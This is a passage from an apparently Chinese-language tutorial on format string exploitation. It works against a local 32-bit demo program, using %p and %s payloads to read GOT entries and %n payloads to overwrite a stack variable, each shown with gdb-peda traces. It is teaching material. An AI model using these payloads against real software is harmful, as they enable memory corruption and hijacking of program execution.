class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   <span class="built_in">printf</span>@GLIBC_2.0</span><br><span class="line">0804a010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a014  00000407 R_386_JUMP_SLOT   00000000   putchar@GLIBC_2.0</span><br><span class="line">0804a018  00000507 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure>

<p><code>.rel.plt</code> 中有四个函数可供我们选择，按理说选择任意一个都没有问题，但是在实践中我们会发现一些问题。下面的结果分别是 <code>printf</code>、<code>__libc_start_main</code>、<code>putchar</code> 和 <code>__isoc99_scanf</code>：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python2 -c <span class="string">'print("\x0c\xa0\x04\x08"+".%p"*20)'</span> | ./a.out</span><br><span class="line">.0x1.0x88888888.0xffffffff.0xffe22cfa.0xffe22d04.0x80481fc.0x80484b0.0xf77afa54.0x1.0x424155d0.0x4443.(nil).0x2e0804a0.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025</span><br><span class="line">$ python2 -c <span class="string">'print("\x10\xa0\x04\x08"+".%p"*20)'</span> | ./a.out</span><br><span class="line">.0x1.0x88888888.0xffffffff.0xffd439ba.0xffd439c4.0x80481fc.0x80484b0.0xf77b6a54.0x1.0x4241c5d0.0x4443.(nil).0x804a010.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e</span><br><span class="line">$ python2 -c <span class="string">'print("\x14\xa0\x04\x08"+".%p"*20)'</span> | ./a.out</span><br><span class="line">.0x1.0x88888888.0xffffffff.0xffcc17aa.0xffcc17b4.0x80481fc.0x80484b0.0xf7746a54.0x1.0x4241c5d0.0x4443.(nil).0x804a014.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e</span><br><span class="line">$ python2 -c <span class="string">'print("\x18\xa0\x04\x08"+".%p"*20)'</span> | ./a.out</span><br><span class="line">▒.0x1.0x88888888.0xffffffff.0xffcb99aa.0xffcb99b4.0x80481fc.0x80484b0.0xf775ca54.0x1.0x424125d0.0x4443.(nil).0x804a018.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e</span><br></pre></td></tr></table></figure>

<p>细心一点你就会发现第一个（<code>printf</code>）的结果有问题。我们输入了 <code>\x0c\xa0\x04\x08</code>（<code>0x0804a00c</code>），可是 13 号位置输出的结果却是 <code>0x2e0804a0</code>，那么，<code>\x0c</code> 哪去了，查了一下 ASCII 表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Oct   Dec   Hex   Char</span><br><span class="line">──────────────────────────────────────</span><br><span class="line">014   12    0C    FF  &#39;\f&#39; (form feed)</span><br></pre></td></tr></table></figure>

<p>于是就被省略了，同样会被省略的还有很多，如 <code>\x07</code>（’\a’）、<code>\x08</code>（’\b’）、<code>\x20</code>（SPACE）等的不可见字符都会被省略。这就会让我们后续的操作出现问题。所以这里我们选用最后一个（<code>__isoc99_scanf</code>）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">$ python2 -c &#39;print(&quot;\x18\xa0\x04\x08&quot;+&quot;%13$s&quot;)&#39; &gt; text</span><br><span class="line">$ gdb -q a.out</span><br><span class="line">Reading symbols from a.out...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ b printf</span><br><span class="line">Breakpoint 1 at 0x8048350</span><br><span class="line">gdb-peda$ r &lt; text</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd584 --&gt; 0x804a018 --&gt; 0xf7e3a790 (&lt;__isoc99_scanf&gt;: push   ebp)</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0xf7f9883c --&gt; 0x0</span><br><span class="line">ESI: 0xf7f96e68 --&gt; 0x1bad90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd618 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd54c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)</span><br><span class="line">EIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)</span><br><span class="line">EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e27c1b &lt;fprintf+27&gt;:     ret</span><br><span class="line">   0xf7e27c1c:  xchg   ax,ax</span><br><span class="line">   0xf7e27c1e:  xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243</span><br><span class="line">   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc</span><br><span class="line">   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]</span><br><span class="line">   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd54c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)</span><br><span class="line">0004| 0xffffd550 --&gt; 0xffffd584 --&gt; 0x804a018 --&gt; 0xf7e3a790 (&lt;__isoc99_scanf&gt;: push   ebp)</span><br><span class="line">0008| 0xffffd554 --&gt; 0x1</span><br><span class="line">0012| 0xffffd558 --&gt; 0x88888888</span><br><span class="line">0016| 0xffffd55c --&gt; 0xffffffff</span><br><span class="line">0020| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)</span><br><span class="line">0024| 0xffffd564 --&gt; 0xffffd584 --&gt; 0x804a018 --&gt; 0xf7e3a790 (&lt;__isoc99_scanf&gt;: push   ebp)</span><br><span class="line">0028| 0xffffd568 --&gt; 0x80481fc --&gt; 0x38 (&#39;8&#39;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e27c20 in printf () from &#x2F;usr&#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ x&#x2F;20w $esp</span><br><span class="line">0xffffd54c:     0x08048520      0xffffd584      0x00000001      0x88888888</span><br><span class="line">0xffffd55c:     0xffffffff      0xffffd57a      0xffffd584      0x080481fc</span><br><span class="line">0xffffd56c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0</span><br><span class="line">0xffffd57c:     0x00004443      0x00000000      0x0804a018      0x24333125</span><br><span class="line">0xffffd58c:     0x00f00073      0xffffd5ca      0x00000001      0x000000c2</span><br><span class="line">gdb-peda$ x&#x2F;w 0x804a018</span><br><span class="line">0x804a018:      0xf7e3a790</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">▒����</span><br></pre></td></tr></table></figure>

<p>虽然我们可以通过 <code>x/w</code> 指令得到 <code>__isoc99_scanf</code> 函数的虚拟地址 <code>0xf7e3a790</code>。但是由于 <code>0x804a018</code> 处的内容是仍然一个指针，使用 <code>%13$s</code> 打印并不成功。在下面的内容中将会介绍怎样借助 pwntools 的力量，来获得正确格式的虚拟地址，并能够对它有进一步的利用。</p>
<p>当然并非总能通过使用 4 字节的跳转（如 <code>AAAA</code>）来步进参数指针去引用格式字符串的起始部分，有时，需要在格式字符串之前加一个、两个或三个字符的前缀来实现一系列的 ４ 字节跳转。</p>
<h3 id="覆盖栈内容"><a href="#覆盖栈内容" class="headerlink" title="覆盖栈内容"></a>覆盖栈内容</h3><p>现在我们已经可以读取栈上和任意地址的内存了，接下来我们更进一步，通过修改栈和内存来劫持程序的执行流程。<code>%n</code> 转换指示符将 <code>%n</code> 当前已经成功写入流或缓冲区中的字符个数存储到地址由参数指定的整数中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> str[] = <span class="string">"hello"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s %n\n"</span>, str, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>i</code> 被赋值为 6，因为在遇到转换指示符之前一共写入了 6 个字符（<code>hello</code> 加上一个空格）。在没有长度修饰符时，默认写入一个 <code>int</code> 类型的值。</p>
<p>通常情况下，我们要需要覆写的值是一个 shellcode 的地址，而这个地址往往是一个很大的数字。这时我们就需要通过使用具体的宽度或精度的转换规范来控制写入的字符个数，即在格式字符串中加上一个十进制整数来表示输出的最小位数，如果实际位数大于定义的宽度，则按实际位数输出，反之则以空格或 0 补齐（<code>0</code> 补齐时在宽度前加点<code>.</code> 或 <code>0</code>）。如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%10u%n\n"</span>, <span class="number">1</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.50u%n\n"</span>, <span class="number">1</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%0100u%n\n"</span>, <span class="number">1</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ./a.out</span><br><span class="line">         1</span><br><span class="line">10</span><br><span class="line">00000000000000000000000000000000000000000000000001</span><br><span class="line">50</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001</span><br><span class="line">100</span><br></pre></td></tr></table></figure>

<p>就是这样，下面我们把地址 <code>0x8048000</code> 写入内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%0134512640d%n\n"</span>, <span class="number">1</span>, &amp;i);</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./a.out</span><br><span class="line">...</span><br><span class="line">0x8048000</span><br></pre></td></tr></table></figure>

<p>还是我们一开始的程序，我们尝试将 <code>arg2</code> 的值更改为任意值（比如 <code>0x00000020</code>，十进制 32），在 gdb 中可以看到得到 <code>arg2</code> 的地址 <code>0xffffd538</code>，那么我们构造格式字符串 <code>\x38\xd5\xff\xff%08x%08x%012d%13$n</code>，其中 <code>\x38\xd5\xff\xff</code> 表示 <code>arg2</code> 的地址，占 4 字节，<code>%08x%08x</code> 表示两个 8 字符宽的十六进制数，占 16 字节，<code>%012d</code> 占 12 字节，三个部分加起来就占了 4+16+12=32 字节，即把 <code>arg2</code> 赋值为 <code>0x00000020</code>。格式字符串最后一部分 <code>%13$n</code> 也是最重要的一部分，和上面的内容一样，表示格式字符串的第 13 个参数，即写入 <code>0xffffd538</code> 的地方（<code>0xffffd564</code>），<code>printf()</code> 就是通过这个地址找到被覆盖的内容的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">$ python2 -c &#39;print(&quot;\x38\xd5\xff\xff%08x%08x%012d%13$n&quot;)&#39; &gt; text</span><br><span class="line">$ gdb -q a.out</span><br><span class="line">Reading symbols from a.out...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ b printf  </span><br><span class="line">Breakpoint 1 at 0x8048350</span><br><span class="line">gdb-peda$ r &lt; text  </span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0xf7f9883c --&gt; 0x0</span><br><span class="line">ESI: 0xf7f96e68 --&gt; 0x1bad90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd5f8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)</span><br><span class="line">EIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e27c1b &lt;fprintf+27&gt;:     ret</span><br><span class="line">   0xf7e27c1c:  xchg   ax,ax</span><br><span class="line">   0xf7e27c1e:  xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243</span><br><span class="line">   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc</span><br><span class="line">   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]</span><br><span class="line">   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)</span><br><span class="line">0004| 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888</span><br><span class="line">0008| 0xffffd534 --&gt; 0x1</span><br><span class="line">0012| 0xffffd538 --&gt; 0x88888888</span><br><span class="line">0016| 0xffffd53c --&gt; 0xffffffff</span><br><span class="line">0020| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)</span><br><span class="line">0024| 0xffffd544 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888</span><br><span class="line">0028| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 (&#39;8&#39;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e27c20 in printf () from &#x2F;usr&#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ x&#x2F;20x $esp</span><br><span class="line">0xffffd52c:     0x08048520      0xffffd564      0x00000001      0x88888888</span><br><span class="line">0xffffd53c:     0xffffffff      0xffffd55a      0xffffd564      0x080481fc</span><br><span class="line">0xffffd54c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0</span><br><span class="line">0xffffd55c:     0x00004443      0x00000000      0xffffd538      0x78383025</span><br><span class="line">0xffffd56c:     0x78383025      0x32313025      0x33312564      0x00006e24</span><br><span class="line">gdb-peda$ finish</span><br><span class="line">Run till exit from #0  0xf7e27c20 in printf () from &#x2F;usr&#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x20 (&#39; &#39;)</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1</span><br><span class="line">ECX: 0x0</span><br><span class="line">EDX: 0xf7f98830 --&gt; 0x0</span><br><span class="line">ESI: 0xf7f96e68 --&gt; 0x1bad90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd5f8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x20 (&#39; &#39;)</span><br><span class="line">EIP: 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)</span><br><span class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048514 &lt;main+126&gt;:        lea    eax,[ebp-0x94]</span><br><span class="line">   0x804851a &lt;main+132&gt;:        push   eax</span><br><span class="line">   0x804851b &lt;main+133&gt;:        call   0x8048350 &lt;printf@plt&gt;</span><br><span class="line">&#x3D;&gt; 0x8048520 &lt;main+138&gt;:        add    esp,0x20</span><br><span class="line">   0x8048523 &lt;main+141&gt;:        sub    esp,0xc</span><br><span class="line">   0x8048526 &lt;main+144&gt;:        push   0xa</span><br><span class="line">   0x8048528 &lt;main+146&gt;:        call   0x8048370 &lt;putchar@plt&gt;</span><br><span class="line">   0x804852d &lt;main+151&gt;:        add    esp,0x10</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x20 (&#39; &#39;)</span><br><span class="line">0004| 0xffffd534 --&gt; 0x1</span><br><span class="line">0008| 0xffffd538 --&gt; 0x20 (&#39; &#39;)</span><br><span class="line">0012| 0xffffd53c --&gt; 0xffffffff</span><br><span class="line">0016| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)</span><br><span class="line">0020| 0xffffd544 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x20 (&#39; &#39;)</span><br><span class="line">0024| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 (&#39;8&#39;)</span><br><span class="line">0028| 0xffffd54c --&gt; 0x80484b0 (&lt;main+26&gt;:      add    ebx,0x1b50)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048520 in main ()</span><br><span class="line">gdb-peda$ x&#x2F;20x $esp</span><br><span class="line">0xffffd530:     0xffffd564      0x00000001      0x00000020      0xffffffff</span><br><span class="line">0xffffd540:     0xffffd55a      0xffffd564      0x080481fc      0x080484b0</span><br><span class="line">0xffffd550:     0xf7ffda54      0x00000001      0x424135d0      0x00004443</span><br><span class="line">0xffffd560:     0x00000000      0xffffd538      0x78383025      0x78383025</span><br><span class="line">0xffffd570:     0x32313025      0x33312564      0x00006e24      0xf7e70240</span><br></pre></td></tr></table></figure>

<p>对比 <code>printf()</code> 函数执行前后的输出，<code>printf</code> 首先解析 <code>%13$n</code> 找到获得地址 <code>0xffffd564</code> 的值 <code>0xffffd538</code>，然后跳转到地址 <code>0xffffd538</code>，将它的值 <code>0x88888888</code> 覆盖为 <code>0x00000020</code>，就得到 <code>arg2=0x00000020</code>。</p>
<h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><p>也许已经有人发现了一个问题，使用上面覆盖内存的方法，值最小只能是 4，因为单单地址就占去了 4 个字节。那么我们怎样覆盖比 4 小的值呢。利用整数溢出是一个方法，但是在实践中这样做基本都不会成功。再想一下，前面的输入中，地址都位于格式字符串之前，这样做真的有必要吗，能否将地址放在中间。我们来试一下，使用格式字符串 <code>&quot;AA%15$nA&quot;+&quot;\x38\xd5\xff\xff&quot;</code>，开头的 <code>AA</code> 占两个字节，即将地址赋值为 <code>2</code>，中间是 <code>%15$n</code> 占 5 个字节，这里不是 <code>%13$n</code>，因为地址被我们放在了后面，在格式字符串的第 15 个参数，后面跟上一个 <code>A</code> 占用一个字节。于是前半部分总共占用了 2+5+1=8 个字节，刚好是两个参数的宽度，这里的 8 字节对齐十分重要。最后再输入我们要覆盖的地址 <code>\x38\xd5\xff\xff</code>，详细输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">$ python2 -c &#39;print(&quot;AA%15$nA&quot;+&quot;\x38\xd5\xff\xff&quot;)&#39; &gt; text</span><br><span class="line">$ gdb -q a.out</span><br><span class="line">Reading symbols from a.out...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ b printf  </span><br><span class="line">Breakpoint 1 at 0x8048350</span><br><span class="line">gdb-peda$ r &lt; text  </span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd564 (&quot;AA%15$nA8\325\377\377&quot;)</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0xf7f9883c --&gt; 0x0</span><br><span class="line">ESI: 0xf7f96e68 --&gt; 0x1bad90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd5f8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)</span><br><span class="line">EIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e27c1b &lt;fprintf+27&gt;:     ret</span><br><span class="line">   0xf7e27c1c:  xchg   ax,ax</span><br><span class="line">   0xf7e27c1e:  xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243</span><br><span class="line">   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc</span><br><span class="line">   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]</span><br><span class="line">   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)</span><br><span class="line">0004| 0xffffd530 --&gt; 0xffffd564 (&quot;AA%15$nA8\325\377\377&quot;)</span><br><span class="line">0008| 0xffffd534 --&gt; 0x1</span><br><span class="line">0012| 0xffffd538 --&gt; 0x88888888</span><br><span class="line">0016| 0xffffd53c --&gt; 0xffffffff</span><br><span class="line">0020| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)</span><br><span class="line">0024| 0xffffd544 --&gt; 0xffffd564 (&quot;AA%15$nA8\325\377\377&quot;)</span><br><span class="line">0028| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 (&#39;8&#39;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e27c20 in printf () from &#x2F;usr&#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ x&#x2F;20x $esp</span><br><span class="line">0xffffd52c:     0x08048520      0xffffd564      0x00000001      0x88888888</span><br><span class="line">0xffffd53c:     0xffffffff      0xffffd55a      0xffffd564      0x080481fc</span><br><span class="line">0xffffd54c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0</span><br><span 